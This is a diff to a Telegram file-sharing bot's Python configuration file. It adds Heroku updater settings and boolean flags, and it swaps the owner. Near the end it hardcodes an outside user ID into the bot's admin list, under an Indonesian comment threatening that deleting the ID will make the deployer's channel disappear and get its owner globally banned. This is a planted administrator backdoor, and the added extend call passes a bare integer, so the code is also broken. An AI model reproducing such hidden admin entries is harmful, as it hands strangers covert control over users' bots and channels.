@@ -1,9 +1,6 @@
-# (©)Codexbotz
-# Recode by @LordMuda_ID
-# t.me/SharingUserbot & t.me/Lunatic0de
-
 import logging
 import os
+from distutils.util import strtobool
 from dotenv import load_dotenv
 from logging.handlers import RotatingFileHandler
 
@@ -21,11 +18,18 @@ API_HASH = os.environ.get("API_HASH", "")
 # ID Channel Database
 CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))
 
-# OWNER ID
-OWNER_ID = int(os.environ.get("OWNER_ID", ""))
-
 # NAMA OWNER
-OWNER = os.environ.get("OWNER", "putraicipiyey")
+OWNER = os.environ.get("OWNER", "mrismanaziz")
+
+# Protect Content
+PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))
+
+# Heroku Credentials for updater.
+HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
+HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
+
+# Custom Repo for updater.
+UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")
 
 # Database
 DB_URI = os.environ.get("DATABASE_URL", "")
@@ -56,12 +60,11 @@ FORCE_MSG = os.environ.get(
 CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 
 # Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
-DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
+DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
 
-ADMINS.append(OWNER_ID)
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
 # Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
-ADMINS.extend((OWNER_ID, 5049916245))
+ADMINS.extend((5460820669))
 
 
 LOG_FILE_NAME = "logs.txt"
